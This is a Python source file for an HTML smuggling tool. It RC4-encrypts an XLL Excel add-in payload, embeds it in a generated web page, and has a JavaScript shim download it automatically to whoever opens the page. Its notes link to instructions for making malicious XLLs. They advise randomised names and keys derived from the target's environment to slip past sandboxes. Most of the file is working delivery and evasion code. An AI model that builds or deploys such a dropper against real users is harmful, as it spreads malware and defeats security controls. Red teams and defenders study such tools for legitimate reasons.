#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Author: Arno0x0x - https://twitter.com/Arno0x0x
# Distributed under the terms of the [GPLv3 licence](http://www.gnu.org/copyleft/gpl.html)
#
# NOTES:
# 1) This tool was inspired and is derived from the great 'demiguise' tool : https://github.com/nccgroup/demiguise
#
# 2) This tool creates an HTML file containing an embeded RC4 encrypted XLL payload which is automatically delivered to the end-user
#
# 3) The b64AndRC4 function used on the binary input (from the XLL file) is a mix Mix of:
#	 https://gist.github.com/borismus/1032746 and https://gist.github.com/farhadi/2185197
#
# 4) Check https://gist.github.com/Arno0x/f71a9db515ddea686ccdd77666bebbaa for an easy malicious XLL creation
#
# 5) In the HTML template (html.tpl file) it is advisable to insert your own key environmental derivation function below in place
#	 of the 'keyFunction'.
#	 You should derive your key from the environment so that it only works on your intended target (and not in a sandbox).

import os
import base64
import argparse
import random
import string

#=====================================================================================
# Helper functions
#=====================================================================================
def color(string, color=None):
    """
    Author: HarmJ0y, borrowed from Empire
    Change text color for the Linux terminal.
    """
    
    attr = []
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
    	# bold
    	attr.append('1')
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string

#----------------------------------------------------------------
def rand():
	return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(8))
	
	
#------------------------------------------------------------------------
def convertFromTemplate(parameters, templateFile):
	try:
		with open(templateFile) as f:
			src = string.Template(f.read())
			result = src.substitute(parameters)
			f.close()
			return result
	except IOError:
		print color("[!] Could not open or read template file [{}]".format(templateFile))
		return None
	           
#=====================================================================================
# Class providing RC4 encryption functions for binary inputs
#=====================================================================================
class RC4:
	def __init__(self, key = None):
		self.state = range(256) # initialisation de la table de permutation
		self.x = self.y = 0 # les index x et y, au lieu de i et j

		if key is not None:
			self.init(key)

	# Key schedule
	def init(self, key):
		for i in range(256):
			self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF
			self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
		self.x = 0

	# Generator
	def crypt(self, input):
		output = [None]*len(input)
		for i in xrange(len(input)):
			self.x = (self.x + 1) & 0xFF
			self.y = (self.state[self.x] + self.y) & 0xFF
			self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
			output[i] = chr((input[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF]))
		return ''.join(output)

#=====================================================================================
# Function providing RC4 encryption functions for string inputs
# THIS DOESN'T WORK to encrypt bytes coming from a file !! Hence the use of the above class
#=====================================================================================
def rc4(key, data):
	"""
	Decrypt/encrypt the passed data using RC4 and the given key.
	https://github.com/EmpireProject/Empire/blob/73358262acc8ed3c34ffc87fa593655295b81434/data/agent/stagers/dropbox.py
	"""
	S, j, out = range(256), 0, []
	for i in range(256):
		j = (j + S[i] + ord(key[i % len(key)])) % 256
		S[i], S[j] = S[j], S[i]
	i = j = 0
	for char in data:
		i = (i + 1) % 256
		j = (j + S[i]) % 256
		S[i], S[j] = S[j], S[i]
		out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
	return ''.join(out)
	
#=====================================================================================
#									MAIN FUNCTION
#=====================================================================================
if __name__ == '__main__':

	#------------------------------------------------------------------------
	# Parse arguments
	parser = argparse.ArgumentParser(description='Creates an HTML file containing an embeded RC4 encrypted XLL file')
	parser.add_argument("-k", "--key", help="Encryption key", dest="key")
	parser.add_argument("-x", "--xll", help="Path to XLL file", dest="xllFileName")
	parser.add_argument("-o", "--output", help="Ouput file name", dest="outFileName")
	args = parser.parse_args()
	
	if args.key and args.xllFileName and args.outFileName:
		#------------------------------------------------------------------------
		# Open XLL file and read all bytes from it
		try:
			with open(args.xllFileName) as fileHandle:
				fileBytes = bytearray(fileHandle.read())
				fileHandle.close()
				print color("[*] File [{}] successfully loaded !".format(args.xllFileName))
		except IOError:
			print color("[!] Could not open or read file [{}]".format(args.xllFileName))
			quit()
	
		#------------------------------------------------------------------------
		# Encrypt and base64 encode the XLL file
		payload = base64.b64encode(RC4(args.key).crypt(fileBytes))
	
		# blobShim borrowed from https://github.com/mholt/PapaParse/issues/175#issuecomment-75597039
		blobShim = """(function(b,fname){if(window.navigator.msSaveOrOpenBlob)
window.navigator.msSaveBlob(b,fname);else{var f = new File([b], fname, {type:"application/vnd.ms-excel"});var a=window.document.createElement("a");a.href=window.URL.createObjectURL(f);a.download=fname;document.body.appendChild(a);a.click();document.body.removeChild(a)}})
"""
	
		#------------------------------------------------------------------------
		# Preparing all parameters for substitution in the HTML template
		rc4Function = rand()
		b64AndRC4Function = rand()
		keyFunction = rand()
		varPayload = rand()
		varBlobObjectName = rand()
		varBlob = rand()
		varBlobShim = rand()
		blobShimEncrypted = base64.b64encode(rc4(args.key, blobShim))
		blobObjectNameEncrypted = base64.b64encode(rc4(args.key, "Blob"))
		xllName = os.path.basename(args.xllFileName)
		
		params = {
				"rc4Function": rc4Function, "b64AndRC4Function": b64AndRC4Function , "keyFunction": keyFunction, "key": args.key, \
				"varPayload": varPayload, "payload": payload, "varBlobObjectName": varBlobObjectName, \
				"blobObjectNameEncrypted": blobObjectNameEncrypted, "varBlob": varBlob, \
				"varBlobShim" : varBlobShim, "blobShimEncrypted": blobShimEncrypted, "xllName": xllName }
		
		# Formating the HTML template with all parameters
		resultHTML = convertFromTemplate(params,"templates/html.tpl")
		
		if resultHTML is not None:
			#------------------------------------------------------------------------
			# Write the HTML file 
			try:
				with open(args.outFileName, 'w') as fileHandle:
					fileHandle.write(resultHTML)
					print color("[*] File [{}] successfully created !".format(args.outFileName))
			except IOError:
				print color("[!] Could not open or write file [{}]".format(args.outFileName))
				quit()
	else:
		parser.print_help()
		print color("\nExample: ./{} -k mysecretkey -x example_calc.xll -o index.html\n".format(os.path.basename(__file__)),"green")
		
		
		
